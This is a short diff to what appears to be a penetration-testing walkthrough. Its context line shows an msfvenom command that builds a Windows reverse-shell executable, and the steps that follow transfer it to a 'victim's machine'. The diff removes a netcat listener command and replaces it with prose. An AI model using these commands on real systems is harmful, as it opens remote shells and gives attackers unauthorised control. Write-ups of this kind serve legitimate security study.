@@ -93,11 +93,7 @@ msfvenom -p windows/x64/shell_reverse_tcp LHOST=eth0 LPORT=1234 -f exe > nikos.e
 
 2) Transfer the malicious executable file to victim's machine.
 
-3) open a listener from your attacking machine:
-
-```
-nc -lvp 1234
-```
+3) open a listener from your attacking machine.
 
 4) Grant full access permissions to all users:
 
